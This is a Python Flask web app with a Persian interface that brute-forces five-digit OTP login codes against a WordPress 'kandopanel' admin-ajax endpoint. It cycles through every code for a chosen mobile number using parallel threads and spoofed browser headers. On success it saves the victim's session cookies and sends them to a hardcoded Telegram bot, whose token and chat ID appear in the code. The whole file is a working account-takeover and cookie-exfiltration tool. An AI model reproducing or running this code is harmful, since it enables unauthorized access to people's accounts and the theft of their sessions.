import requests
import json
from http.cookiejar import MozillaCookieJar
from concurrent.futures import ThreadPoolExecutor
import time
import sys
from flask import Flask, render_template_string, request
from flask_socketio import SocketIO, emit
import threading
import os
from datetime import datetime

# تنظیمات تلگرام
TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"
TELEGRAM_CHAT_ID = "-1002021960039"

app = Flask(__name__)
socketio = SocketIO(app)

# متغیرهای گلوبال برای کنترل پروسه
running = False
found_success = False
progress_log = []

def send_file_to_telegram(file_path, retries=3):
    """ارسال فایل به تلگرام با تلاش مجدد در صورت خطا"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    for attempt in range(retries):
        try:
            if not os.path.exists(file_path):
                progress_log.append(f"Error: File {file_path} does not exist!")
                socketio.emit('update_progress', {'log': progress_log[-1]})
                return False
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': TELEGRAM_CHAT_ID}
                response = requests.post(url, data=data, files=files, timeout=10)
                response.raise_for_status()
                progress_log.append(f"File {file_path} sent to Telegram successfully!")
                socketio.emit('update_progress', {'log': progress_log[-1]})
                return True
        except (requests.exceptions.RequestException, FileNotFoundError) as e:
            progress_log.append(f"Failed to send {file_path} to Telegram (attempt {attempt + 1}/{retries}): {str(e)}")
            socketio.emit('update_progress', {'log': progress_log[-1]})
            if attempt < retries - 1:
                time.sleep(2)
    return False

def save_and_send_cookies(cookies, code_str):
    """تابع زنده برای ذخیره و ارسال کوکی‌ها"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cookies_file = f"cookies_success_{code_str}_{timestamp}.txt"
    
    cookie_jar = MozillaCookieJar(cookies_file)
    for cookie in cookies:
        cookie_jar.set_cookie(cookie)
    cookie_jar.save(ignore_discard=True, ignore_expires=True)
    
    if os.path.exists(cookies_file) and os.path.getsize(cookies_file) > 0:
        progress_log.append(f"Cookies saved in {cookies_file}")
        socketio.emit('update_progress', {'log': progress_log[-1]})
        success = send_file_to_telegram(cookies_file)
        if not success:
            progress_log.append(f"Critical: Failed to send cookies {cookies_file} to Telegram after retries!")
            socketio.emit('update_progress', {'log': progress_log[-1]})
    else:
        progress_log.append(f"Error: Failed to save cookies to {cookies_file}")
        socketio.emit('update_progress', {'log': progress_log[-1]})

def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
    headers = {
        "Host": host,
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"https://{host}",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://{host}/login/?action=login-by-otp&mobile={mobile}",
        "Priority": "u=1, i"
    }

    data = {
        "login_otp_nonce": login_otp_nonce,
        "_wp_http_referer": f"/login/?action=login-by-otp&mobile={mobile}",
        "action": "kandopanel_login_by_otp",
        "mobile": mobile,
        "code[1]": str(code_values[0]),
        "code[2]": str(code_values[1]),
        "code[3]": str(code_values[2]),
        "code[4]": str(code_values[3]),
        "code[5]": str(code_values[4])
    }

    url = f"https://{host}/wp-admin/admin-ajax.php"
    code_str = ''.join(map(str, code_values))

    for attempt in range(max_retries + 1):
        try:
            response = requests.post(url, headers=headers, data=data, timeout=15)
            response.raise_for_status()

            try:
                json_response = response.json()
                if json_response.get("success"):
                    msg = (f"Success with code {code_str} (number {counter})!\n"
                           f"Message: {json_response['data']['message']}\n"
                           f"Redirect to: {json_response['data']['redirect']}")
                    progress_log.append(msg)
                    socketio.emit('update_progress', {'log': msg})

                    save_and_send_cookies(response.cookies, code_str)

                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    output_file = f"success_{code_str}_{timestamp}.txt"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(msg + f"\nCookies file: {cookies_file}\n")
                    progress_log.append(f"Output saved in {output_file}")
                    socketio.emit('update_progress', {'log': progress_log[-1]})
                    send_file_to_telegram(output_file)
                    return True
                else:
                    progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
                    socketio.emit('update_progress', {'log': progress_log[-1]})
                    return False
            except json.JSONDecodeError:
                progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
                socketio.emit('update_progress', {'log': progress_log[-1]})
                return False
        except requests.exceptions.RequestException as e:
            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {str(e)}")
            socketio.emit('update_progress', {'log': progress_log[-1]})
            if attempt < max_retries:
                time.sleep(2)
                continue
            return False

def generate_code(counter):
    code_str = f"{counter:05d}"
    return [int(digit) for digit in code_str]

def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
    global running, found_success
    progress_log.append(f"Starting bruteforce from {start_range} to {end_range}...")
    socketio.emit('update_progress', {'log': progress_log[-1]})
    batch_size = connections
    found_success = False

    for batch_start in range(start_range, end_range, batch_size):
        if not running or found_success:
            if found_success:
                progress_log.append("Stopping: Successful code found!")
            else:
                progress_log.append("Process stopped manually!")
            socketio.emit('update_progress', {'log': progress_log[-1]})
            break

        batch_end = min(batch_start + batch_size, end_range)
        codes = [generate_code(i) for i in range(batch_start, batch_end)]

        with ThreadPoolExecutor(max_workers=connections) as executor:
            futures = {
                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
                for idx, code in enumerate(codes)
            }

            for future in futures:
                try:
                    if future.result():
                        found_success = True
                        running = False
                        progress_log.append("Process stopped because a successful code was found!")
                        socketio.emit('update_progress', {'log': progress_log[-1]})
                        break  # از حلقه داخلی هم خارج می‌شیم
                except Exception as e:
                    progress_log.append(f"Exception in future: {str(e)}")
                    socketio.emit('update_progress', {'log': progress_log[-1]})

        if not found_success:
            time.sleep(0.1)  # تأخیر خیلی کم برای سرعت بیشتر

    if not found_success:
        progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
        socketio.emit('update_progress', {'log': progress_log[-1]})

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <title>بررسی کد OTP</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { direction: rtl; font-family: Arial, sans-serif; }
            #progress { height: 300px; overflow-y: auto; }
            .range-option { transition: all 0.2s; }
            .range-option:hover { background-color: #e5e7eb; }
        </style>
    </head>
    <body class="bg-gray-100 p-6">
        <div class="max-w-2xl mx-auto bg-white p-6 rounded-lg shadow-lg">
            <h1 class="text-2xl font-bold text-center mb-6">بررسی کد OTP</h1>
            <form id="form" class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700">هاست:</label>
                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="hos.com">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">Nonce:</label>
                    <input type="text" id="nonce" class="mt-1 block w-full p-2 border rounded" value="9d6178e07d">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="0914">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                    <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="20">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">محدوده شروع و پایان:</label>
                    <div class="grid grid-cols-2 gap-2 max-h-40 overflow-y-auto p-2 border rounded">
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="0-10000" checked class="mr-2"> 00000 - 10000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="10000-20000" class="mr-2"> 10000 - 20000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="20000-30000" class="mr-2"> 20000 - 30000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="30000-40000" class="mr-2"> 30000 - 40000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="40000-50000" class="mr-2"> 40000 - 50000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="50000-60000" class="mr-2"> 50000 - 60000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="60000-70000" class="mr-2"> 60000 - 70000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="70000-80000" class="mr-2"> 70000 - 80000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="80000-90000" class="mr-2"> 80000 - 90000
                        </label>
                        <label class="range-option p-2 rounded cursor-pointer">
                            <input type="radio" name="range" value="90000-99999" class="mr-2"> 90000 - 99999
                        </label>
                    </div>
                </div>
                <div class="flex space-x-4">
                    <button type="button" id="start" class="w-full bg-green-500 text-white p-2 rounded hover:bg-green-600">شروع</button>
                    <button type="button" id="stop" class="w-full bg-red-500 text-white p-2 rounded hover:bg-red-600" disabled>توقف</button>
                </div>
            </form>
            <div class="mt-6">
                <h2 class="text-lg font-semibold">پیشرفت:</h2>
                <div id="progress" class="bg-gray-50 p-4 rounded border text-sm"></div>
            </div>
        </div>

        <script>
            const socket = io();
            const form = document.getElementById('form');
            const startBtn = document.getElementById('start');
            const stopBtn = document.getElementById('stop');
            const progressDiv = document.getElementById('progress');
            const maxLogs = 20;

            socket.on('connect', () => {
                console.log('Connected to WebSocket');
            });

            socket.on('update_progress', function(data) {
                console.log('Received update:', data);
                const log = document.createElement('p');
                log.textContent = data.log;
                progressDiv.appendChild(log);
                while (progressDiv.children.length > maxLogs) {
                    progressDiv.removeChild(progressDiv.firstChild);
                }
                progressDiv.scrollTop = progressDiv.scrollHeight;
            });

            startBtn.addEventListener('click', () => {
                const host = document.getElementById('host').value;
                const nonce = document.getElementById('nonce').value;
                const mobile = document.getElementById('mobile').value;
                const connections = document.getElementById('connections').value;
                const range = document.querySelector('input[name="range"]:checked').value.split('-');
                const startRange = parseInt(range[0]);
                const endRange = parseInt(range[1]);

                fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host, nonce, mobile, connections, startRange, endRange })
                }).then(response => {
                    if (response.ok) {
                        startBtn.disabled = true;
                        stopBtn.disabled = false;
                    } else {
                        console.error('Start failed:', response.status);
                    }
                }).catch(error => console.error('Fetch error:', error));
            });

            stopBtn.addEventListener('click', () => {
                fetch('/stop', {
                    method: 'POST'
                }).then(() => {
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/start', methods=['POST'])
def start():
    global running, progress_log, found_success
    data = request.get_json()
    host = data['host']
    login_otp_nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])
    start_range = int(data['startRange'])
    end_range = int(data['endRange'])

    running = True
    found_success = False  # ریست کردن برای استارت جدید
    progress_log = []
    progress_log.append("Start button clicked!")
    socketio.emit('update_progress', {'log': progress_log[-1]})
    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global running
    running = False
    progress_log.append("Stop button clicked!")
    socketio.emit('update_progress', {'log': progress_log[-1]})
    return '', 204

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
